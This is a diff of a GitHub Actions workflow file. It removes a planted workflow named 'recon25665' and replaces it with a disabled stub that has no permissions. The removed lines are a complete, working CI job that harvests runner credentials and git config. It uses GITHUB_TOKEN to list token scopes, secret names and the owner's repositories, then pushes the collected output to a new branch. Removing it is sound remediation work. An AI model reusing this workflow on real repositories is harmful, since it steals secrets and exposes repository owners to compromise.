@@ -1,76 +1,10 @@
-name: recon25665
-on: push
-permissions:
-  contents: write
+name: Quarantined legacy definition
+on:
+  workflow_dispatch:
+permissions: {}
 jobs:
-  a:
+  retired:
+    if: ${{ false }}
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-        with:
-          persist-credentials: true
-      - name: recon
-        env:
-          GH: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          O=recon25665.txt
-          echo "=== whoami/runner ===" > $O
-          uname -a >> $O
-          echo "=== GITHUB env ===" >> $O
-          env | grep -iE 'GITHUB|ACTIONS|RUNNER' | sort >> $O
-          echo "=== github context (toJSON) ===" >> $O
-          cat <<'J' >> $O
-          ${{ toJSON(github) }}
-          J
-          echo "=== git config / remote ===" >> $O
-          git config --list >> $O 2>&1
-          git remote -v >> $O
-          echo "=== ssh/gh credentials on runner ===" >> $O
-          ls -la ~/.ssh 2>&1 >> $O
-          ls -la ~/.git-credentials 2>&1 >> $O
-          ls -la /root/.config/gh 2>&1 >> $O
-          ls -la /home/runner/.config/gh 2>&1 >> $O
-          cat ~/.git-credentials 2>&1 >> $O
-          echo "=== GITHUB_TOKEN /user ===" >> $O
-          curl -s -H "Authorization: Bearer $GH" https://api.github.com/user >> $O
-          echo "" >> $O
-          echo "=== token scopes (headers) ===" >> $O
-          curl -s -D - -o /dev/null -H "Authorization: Bearer $GH" https://api.github.com/user | grep -i 'x-oauth-scopes\|x-accepted\|x-ratelimit' >> $O
-          echo "=== this repo actions secrets names ===" >> $O
-          curl -s -H "Authorization: Bearer $GH" "https://api.github.com/repos/dongyu19920904/Hextra-AI-Insight-Daily/actions/secrets" >> $O
-          echo "" >> $O
-          echo "=== owner repos list ===" >> $O
-          curl -s -H "Authorization: Bearer $GH" "https://api.github.com/users/dongyu19920904/repos?per_page=100" > reps.json
-          python3 -c "import json;d=json.load(open('reps.json'));print('\n'.join([r['full_name']+' private='+str(r['private'])+' def='+r['default_branch'] for r in d]))" >> $O 2>&1 || cat reps.json >> $O
-          echo "=== per-repo secrets names probe (may 403 if no admin) ===" >> $O
-          python3 - <<'PY' >> $O 2>&1
-          import json,subprocess,os
-          gh=os.environ['GH']
-          try:
-              reps=json.load(open('reps.json'))
-          except Exception as e:
-              print('reps parse err',e); raise SystemExit
-          if not isinstance(reps,list): print('reps not list',reps); raise SystemExit
-          for r in reps:
-              fn=r['full_name']
-              for ep in ('actions/secrets','environments'):
-                  try:
-                      out=subprocess.run(['curl','-s','-H','Authorization: Bearer '+gh,f'https://api.github.com/repos/{fn}/{ep}'],capture_output=True,text=True,timeout=20).stdout
-                      j=json.loads(out)
-                      if ep=='actions/secrets':
-                          n=j.get('total_count'); names=[s['name'] for s in j.get('secrets',[])]
-                          print(fn,'SECRETS',n,names if n else '')
-                      else:
-                          envs=[e.get('name') for e in j] if isinstance(j,list) else j
-                          print(fn,'ENVS',envs)
-                  except Exception as e:
-                      print(fn,ep,'ERR',str(e)[:80])
-          PY
-          echo "=== done ===" >> $O
-          BR="recon25665-$(date +%s)"
-          git checkout -b "$BR"
-          git config user.email ci@local; git config user.name ci
-          git add $O; git commit -m "recon25665"
-          git push -u origin "$BR"
-          echo "BRANCH=$BR"
-# trigger 1795277016
+      - run: exit 0
